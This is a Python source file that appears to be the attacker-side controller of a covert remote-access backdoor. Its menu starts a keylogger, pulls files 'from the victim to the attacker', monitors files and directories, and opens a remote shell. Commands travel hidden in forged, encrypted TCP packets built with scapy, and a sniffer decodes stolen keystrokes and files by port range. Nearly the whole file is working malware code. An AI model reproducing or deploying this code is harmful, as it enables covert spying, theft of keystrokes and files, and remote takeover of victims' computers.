
import argparse
import time
from cryptography.fernet import Fernet
from multiprocessing import Process, Manager
from scapy.all import *
from scapy.layers.l2 import Ether
from scapy.layers.inet import IP, TCP
import os

from Client import Client
from FileTransfer import FileTransfer, join_path
from Keylogger import Keylogger
from Monitor import Monitor

CLIENT = None
FILE_TRANSFER = FileTransfer("", None)
KEYLOGGER = Keylogger("", None)
MONITOR = Monitor("", None)
ETHER = Ether()


def createFernetKey(ip):
    with open(join_path("Clients", ip, 'fernet.key'), "wb") as file:
        file.write(Fernet.generate_key())


def readFernetKey(ip):
    try:
        with open('fernet.key', 'rb') as keyfile:
            key = keyfile.read()
        return Fernet(key)
    except FileNotFoundError:
        createFernetKey(ip)
        with open('fernet.key', 'rb') as keyfile:
            key = keyfile.read()
        return Fernet(key)


def menu():
    time.sleep(1)
    print("="*10 + "[MENU]" + "="*10 + "\n"
          "1. Start the key logger\n"
          "2. Stop the key logger\n"
          "3. Transfer a file from the victim to the attacker\n"
          "4. Start monitoring a file\n"
          "5. Stop monitoring a file\n"
          "6. Start monitoring a directory\n"
          "7. Stop monitoring a directory\n"
          "8. Remote shell\n"
          "0. Quit\n"
          )
    selection = input("Select:")
    if selection == '1':
        KEYLOGGER.start()
    elif selection == '2':
        KEYLOGGER.stop()
    elif selection == '3':
        FILE_TRANSFER.send_command()
    elif selection == '4':
        MONITOR.start()
    elif selection == '5':
        MONITOR.stop()
    elif selection == '6':
        MONITOR.start()
    elif selection == '7':
        MONITOR.stop()
    elif selection == '8':
        remote_shell()
    elif selection == '0':
        exit(0)

    else:
        print("Unknown Option Selected!")



def remote_shell():
    command = input("\nEnter a command: ")
    sendp(forgeptk(command), verbose=0)
    time.sleep(2)


def forgeptk(data):
    ipv4 = IP(dst=CLIENT.getIP())
    tcp = TCP(sport=RandNum(8000, 9000), dport=RandNum(40000, 50000), flags='E')
    rawdata = Raw(CLIENT.encryption().encrypt(data.encode()))
    ptk = ETHER / ipv4 / tcp / rawdata
    return ptk


def write_keylogger_log(pkt):
    payload = pkt["Raw"].load
    KEYLOGGER.write_log(payload)


def file_setPath(pkt):
    try:
        filename = FILE_TRANSFER.getEncryption().decrypt(pkt["Raw"].load).decode()
        print(f"fetching: {filename}")
        FILE_TRANSFER.setPath(join_path("Clients", CLIENT.getIP(), "files"), filename)
    except IndexError as error:
        print("***File not exist***")


def update_data(pkt):
    FILE_TRANSFER.update_data(pkt["Raw"].load)


def write_file_data(pkt):
    command = FILE_TRANSFER.getEncryption().decrypt(pkt["Raw"].load).decode()
    if command == "EOF":
        FILE_TRANSFER.write()
    print("Done")


def write_monitor_log(pkt):
    MONITOR.write_log(pkt["Raw"].load)


def remote_shell_result(pkt):
    print(CLIENT.encryption().decrypt(pkt['Raw'].load).decode(), end="")


def recvPacket(pkt):
    try:
        if 10000 <= pkt["TCP"].sport < 20000 and 50000 <= pkt["TCP"].dport < 60000:
            write_keylogger_log(pkt)
        elif 20000 <= pkt["TCP"].sport < 30000 and 40000 <= pkt["TCP"].dport < 50000:
            file_setPath(pkt)
        elif 30000 <= pkt["TCP"].sport < 40000 and 30000 <= pkt["TCP"].dport < 40000:
            update_data(pkt)
        elif 40000 <= pkt["TCP"].sport < 50000 and 20000 <= pkt["TCP"].dport < 30000:
            write_file_data(pkt)
        elif 50000 <= pkt["TCP"].sport < 60000 and 10000 <= pkt["TCP"].dport < 20000:
            write_monitor_log(pkt)
        elif 60000 <= pkt["TCP"].sport < 65535 and 5000 <= pkt["TCP"].dport < 10000:
            remote_shell_result(pkt)

        # if pkt['IP'].src == CLIENT.getIP():
        #     # if pkt['TCP'].flags == 'E':
        #     #     print("received")
        #     #     with open(join_path("Clients", pkt['IP'].src, "keylogger", get_time()),
        #     #               "w") as file:
        #     #         file.write(CLIENT.encryption().decrypt(pkt['Raw'].load).decode())
        #     #         print(f"[{get_time()}] keylogger file received")
        #     if 20000 <= pkt["TCP"].sport < 30000:
        #         if pkt["TCP"].flags == "R":
        #             filename = FILE_TRANSFER.getEncryption().decrypt(pkt["Raw"].load).decode()
        #             print(f"fetching: {filename}")
        #             FILE_TRANSFER.setPath(join_path("Clients", CLIENT.getIP(), "files", filename))
        #         elif pkt["TCP"].flags == "PA":
        #             FILE_TRANSFER.update_data(pkt["Raw"].load)
        #         elif pkt["TCP"].flags == "F":
        #             FILE_TRANSFER.write()
        #
        #     elif 11000 <= pkt["TCP"].sport < 12000:
        #         MONITOR.write_log(pkt["Raw"].load)

    except IndexError or TypeError as error:
        print(error)


def sniffpkt(client, file_transfer):
    global CLIENT
    global FILE_TRANSFER
    CLIENT = client
    FILE_TRANSFER = file_transfer
    while True:
        print("sniffing")
        sniff(filter='tcp and src host ' + CLIENT.getIP(), prn=recvPacket)


def sniffProcess(client, file_transfer):
    proc = Process(target=sniffpkt, args=(client, file_transfer,))
    proc.daemon = True
    return proc


def init_directories(ip):
    if not os.path.isdir("Clients"):
        os.mkdir("Clients")
    try:
        path = join_path("Clients", ip)
        os.mkdir(path)
        print("Directory '% s' created" % ip)
        os.mkdir(join_path(path, "files"))
    except OSError as error:
        print(error)


def parseArg():
    parser = argparse.ArgumentParser()
    parser.add_argument("-s", "--Server", help="IPV4 address of the receiver/victim host")
    args = parser.parse_args()
    if args.Server:
        return args.Server
    else:
        print("Invalid IP address")
        exit(-1)


def main():
    global CLIENT
    global FILE_TRANSFER
    global MONITOR
    global KEYLOGGER
    ip = parseArg()
    init_directories(ip)
    key = readFernetKey(ip)
    CLIENT = Client(ip, key)
    FILE_TRANSFER = FileTransfer(ip, key)
    MONITOR = Monitor(ip, key)
    KEYLOGGER = Keylogger(ip, key)
    sniff_process = sniffProcess(CLIENT, FILE_TRANSFER)
    sniff_process.start()

    while True:
        menu()


if __name__ == '__main__':
    main()

